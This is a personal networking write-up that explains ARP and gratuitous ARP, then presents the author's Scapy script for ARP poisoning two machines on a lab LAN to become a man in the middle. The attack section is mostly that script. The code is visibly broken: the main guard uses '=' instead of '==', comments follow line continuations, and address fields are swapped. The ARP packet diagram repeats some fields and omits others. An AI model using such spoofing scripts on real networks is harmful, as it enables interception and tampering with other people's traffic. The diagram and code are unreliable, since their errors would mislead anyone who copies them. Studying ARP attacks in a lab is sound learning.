# ARP

ARP is a layer 2 Protocl that bridges between the layer 2 (Ethernet) and layer 3 (IP) addressing schemes. Since there is no direct forula used for "translation" between MAC and IP addresses ARP is used to fill that gap.

To route packets through a network, both an IP address and a MAC address are needed, an IP address of the final destination of the packet and the MAC address of the next hop in the route to that final destination dictated by the IP address. When one of these factors are unknown ARp is used to solve for it.

The way it works is by sending a request to the entire network in a broadcast asking who the holder of the IP/MAC address is, so that they can provide the missing address. To further understand let's imagine a scenario:

> An endpoint doesn't know the MAC address of their default gateway to route the message to the internet. That endpoint will send an ARP request to the LAN asking for the MAC of the default gateway.

The protocol's packet format is as follows:

```
0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Hardware Type               | Protocol Type                 |
+---------------+-------------+-------------------------------+
| Hw Addr Len   | Pr Addr Len | Opcode                        |
+-----------------------------+-------------------------------+
| Sender Hardware Address (size is written in Hw Addr Len)    |
|                             +-------------------------------|
|_____________________________|                               |
| Sender Hardware Address (size is written in Hw Addr Len)    |
+-------------------------------------------------------------+
| Target Protocol Address (size is written in Pr Addr Len)    |
|                             +-------------------------------|
|_____________________________|                               |
| Target Protocol Address (size is written in Pr Addr Len)    |
+-------------------------------------------------------------+
```

The `Hardware Type` field is for different types of Layer 2 address formats, together with the `Hardware Address Length` it is used to decide the address in the Sender & Target Hardware address. Same goes for the `Protocol Type` and `Protocol Address Length`.

An Ethernet (Hardware) & IP (Protocol) request can be summed up this way: "Who has [IP/MAC Address]? I am [My IP Address] [My MAC Address]." (In broadcast)
And a reply will be: "I am [IP/MAC Address], my MAC/IP Address is [Address]."

## Gratutious ARP Reply

A gratutious arp is an arp reply that was not prompted by any request, It is usually sent when a machine updates their IP to MAC mapping and wants other machine to update it as well, Or when a new machine joins the network. It may use a gratutious ARP reply to annouce it's existence. A gratutious arp will be sent in broadcast, their Send L2 and L3 address wil use to update the network machine's mac tables, the target L3 and L2 are irrelevant.

There is another use case for the gratutious ARP reply, and that is when **two machines** (Like routers) **use a shared IP** but own **different MAC addresses** Or when they **share both IP and MAC addresses**.

> In the first case (Two routers share an IP address), when one router fails the other router will send a gratutious ARP to let all ther other machines on the network know that the reduntant IP should be mapped to ther other router's MAC address.

> In the second case (Two routers share IP and MAC addresses), when one router fails the other will send a gratutious arp reply to let the switch know to remap the MAC and IP to the (then) inactive port, where the functioning router is connetced. The machines on the network do not update their MAC tables.

# Vulnerability

There is a problem with this system however, ARP responses may be accepted by machines without them ever sending a request. And that may lead to a malicious change in the victim's ARP table. One that let's the attacker become a middlemen! An attacker can then diguise themselves as another machine, and actch all the network directed to that machine. Once they have that network they can alter it, block it or simply just read it.

How I did it, a very simple script. If you want to palce yourself as a middle man in-between two machine's first you have to be on the first Lan. But that's a given, so next you have to make them both think that the other machine is you. And I accomplished that with this simple python script using scapy:

```
# ArpPoisoningAttack.py
# 06.02.2023
# By Daniel

# Imports
from scapy.all import *

# Constants
OPCODE          = 2                     # Reply code

ATTACKER_MAC    = "00:50:56:9a:c6:e5"   # My MAC Address, not used

VICTIM_ONE_MAC  = "00:50:56:9a:b0:60"   # Victim 1's MAC & IP addresses
VICTIM_ONE_IP   = "192.168.100.2"

VICTIM_TWO_MAC  = "00:50:56:9a:30:8a"   # Victim 2's MAC & IP sddresses
VICTIM_TWO_IP   = "192.168.100.1"


def main():
    malicious_arp1 = Ether(dst=VICTIM_TWO_MAC)/\
                     ARP(\
                        op=OPCODE,\                                 # Opcode automatically fills IP and MAC compatible settings for all other fields.
                        psrc=VICTIM_ONE_IP,\                        # When no hardware source is given, it fills the sender's MAC.
                        hwdst=VICTIM_TWO_IP, pdst=VICTIM_TWO_MAC\
                     )

    malicious_arp2 = Ether(dst=VICTIM_ONE_MAC)/\
                     ARP(\
                        op=OPCODE,\
                        psrc=VICTIM_TWO_IP,\                        # This packer will be sent to victim 1, posing as victim 2 with attacker's mac.
                        hwdst=VICTIM_ONE_MAC, pdst=VICTIM_ONE_IP\   # The above packet will be sent to victim 2, posing as victim 1,
                     )
    
    sendp(malicious_arp1)
    sendp(malicious_arp2)                                            # :) You just got poisoned


if (__name__ = "__main__"):
    main()
```

![The packets as seen in wireshark](/Pictures/ARP_Poisoning/Wireshark_View.PNG)

The above script sends a packet to each of the machines posing as the other machine. We can then see the effects on both machine's ARP Tables:

![Machine1, IP: 192.168.100.1](/Pictures/ARP_Poisoning/Victim_1_Poisoned_ARP_Table.PNG)

![Machine2, IP: 192.168.100.2](/Pictures/ARP_Poisoning/Victim_2_Poisoned_ARP_Table.PNG)